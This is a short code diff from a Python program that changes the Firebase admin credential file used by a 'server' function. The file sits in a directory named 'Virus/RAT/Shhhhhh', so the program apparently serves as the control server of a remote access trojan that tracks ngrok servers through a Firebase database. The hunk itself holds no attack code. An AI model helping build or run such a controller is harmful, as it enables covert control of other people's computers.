@@ -91,7 +91,7 @@ def server(parent_frame, go_back_callback=None):
         global firebase_initialized  # используем глобальную переменную
 
         if not firebase_initialized:
-            cred = credentials.Certificate('Virus/RAT/Shhhhhh/ngrokservers-2e669-firebase-adminsdk-fbsvc-3e6b68fbd8.json')
+            cred = credentials.Certificate('Virus/RAT/Shhhhhh/ngrokservers-2e669-firebase-adminsdk-fbsvc-35078fe2e4.json')
             firebase_admin.initialize_app(cred, {
                 'databaseURL': 'https://ngrokservers-2e669-default-rtdb.europe-west1.firebasedatabase.app/'
             })
